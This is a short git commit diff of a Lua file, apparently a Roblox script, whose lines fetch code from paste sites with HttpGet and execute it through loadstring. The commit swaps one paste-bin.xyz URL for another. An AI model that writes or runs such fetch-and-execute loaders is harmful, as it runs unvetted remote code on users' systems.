052c6c30ecc699bfc0aa4de37e9dd79f8e811690
Mark <jaimepersonal46@gmail.com>
2025-12-22 08:21:23 +0100

    Update Script.lua

--- Script.lua
+++ Script.lua
@@ -3,7 +3,6 @@ local fenv = getfenv()
 task.spawn(function()
     loadstring(game:HttpGet("https://cdn.sourceb.in/bins/frFvztQ8JR/0"))()
 end)
-loadstring(game:HttpGet("https://paste-bin.xyz/raw/8216703"))()
-
+loadstring(game:HttpGet("https://paste-bin.xyz/raw/8216049"))()
 
 
